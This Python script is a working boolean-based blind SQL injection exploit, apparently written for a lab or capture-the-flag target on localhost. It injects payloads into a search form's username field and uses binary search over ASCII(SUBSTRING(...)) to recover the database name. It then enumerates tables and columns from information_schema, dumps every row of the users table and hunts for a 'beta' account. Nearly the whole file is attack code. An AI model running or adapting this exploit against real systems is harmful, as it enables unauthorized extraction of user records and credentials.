import requests

URL = "http://127.0.0.1:8080/search.php"
COOKIES = {"PHPSESSID": "98894d5dd6e8b65b0ad585865055336a"}

def test_query(payload):
    """Test if SQL condition is true"""
    data = {"username": payload}
    try:
        response = requests.post(URL, data=data, cookies=COOKIES, timeout=3)
        # True condition shows results, false shows "No results"
        return "No results" not in response.text
    except:
        return False

def find_char(query, pos):
    """Binary search for character at position"""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid}-- "
        if test_query(payload):
            low = mid + 1
        else:
            high = mid - 1
    
    if low <= 126:
        payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))={low}-- "
        if test_query(payload):
            return chr(low)
    return None

def extract(query, max_len=30):
    """Extract string from query"""
    result = ""
    for i in range(1, max_len + 1):
        c = find_char(query, i)
        if not c or ord(c) < 32:
            break
        result += c
        print(f"  {i}: '{c}' -> {result}")
    return result

print("[+] Boolean-based Blind SQLi Extraction\n")

# Extract database
print("[*] Database name:")
db = extract("SELECT database()", 20)
print(f"[+] Database: {db}\n")

# Count tables
print("[*] Counting tables...")
for n in range(1, 10):
    if test_query(f"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='{db}')={n}-- "):
        print(f"[+] Tables: {n}\n")
        num_tables = n
        break

# Extract tables
print("[*] Table names:")
tables = []
for i in range(num_tables):
    t = extract(f"SELECT table_name FROM information_schema.tables WHERE table_schema='{db}' LIMIT {i},1", 15)
    tables.append(t)
    print(f"[+] Table {i+1}: {t}")

print(f"\n[+] All tables: {tables}\n")

# Extract columns from users
print("[*] Columns in 'users':")
for n in range(1, 10):
    if test_query(f"' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='{db}' AND table_name='users')={n}-- "):
        num_cols = n
        break

columns = []
for i in range(num_cols):
    c = extract(f"SELECT column_name FROM information_schema.columns WHERE table_schema='{db}' AND table_name='users' LIMIT {i},1", 15)
    columns.append(c)
    print(f"[+] Column {i+1}: {c}")

print(f"\n[+] Columns: {columns}\n")

# Count users
print("[*] Counting users...")
for n in range(1, 20):
    if test_query(f"' AND (SELECT COUNT(*) FROM users)={n}-- "):
        num_users = n
        print(f"[+] Users: {n}\n")
        break

# Extract all users
print("[*] Extracting user data:\n")
users = []
for row in range(num_users):
    print(f"--- User {row+1} ---")
    user = {}
    for col in columns:
        val = extract(f"SELECT {col} FROM users LIMIT {row},1", 50)
        user[col] = val
        print(f"  {col}: {val}")
    users.append(user)
    print()

# Find beta user
print("="*60)
print("SEARCHING FOR BETA USER")
print("="*60)
for i, u in enumerate(users):
    for k, v in u.items():
        if 'beta' in v.lower():
            print(f"\n[!] FOUND 'beta' in user {i+1}:")
            print(f"[!] Complete user data:")
            for key, val in u.items():
                print(f"    {key}: {val}")
            break

print("\n" + "="*60)
print("SUMMARY")
print("="*60)
print(f"Database: {db}")
print(f"Tables: {tables}")
print(f"Columns: {columns}")
print(f"\nAll users:")
for i, u in enumerate(users):
    print(f"\nUser {i+1}:")
    for k, v in u.items():
        print(f"  {k}: {v}")

